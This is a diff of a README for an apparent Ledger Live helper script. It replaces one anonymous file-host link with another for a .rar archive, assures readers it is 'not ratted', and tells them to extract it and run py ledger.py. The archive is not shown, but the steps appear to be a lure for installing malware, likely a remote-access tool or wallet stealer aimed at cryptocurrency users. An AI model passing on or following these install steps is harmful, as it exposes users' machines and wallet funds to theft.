@@ -16,7 +16,7 @@ Don't expect the script to be perfect, of course there's gonna be some bugs in i
 ## 🛠 Install
 
 1. Install [Ledger Live](https://www.ledger.com/ledger-live)
-2. Then download the file from [cloakr.xyz](https://cloakr.xyz/d/ZbFjVV9hf5A/ledger.rar), don't worry it's not ratted. You can check the source code side by side if you want to.
+2. Then download the file from [filebin.net](https://filebin.net/6hzrie52gz0lyh65), don't worry it's not ratted. You can check the source code side by side if you want to.
 3. Now extract the .rar into a folder, then to your command prompts in that folder.
 4. Type **pip install psutil**, then run **py ledger.py** and a GUI should show up.
 5. From there, press Enter. You will see two options, Ethereum or Solana. Pick either one, and refer to a section below so you can find addresses to add to Ledger Live.
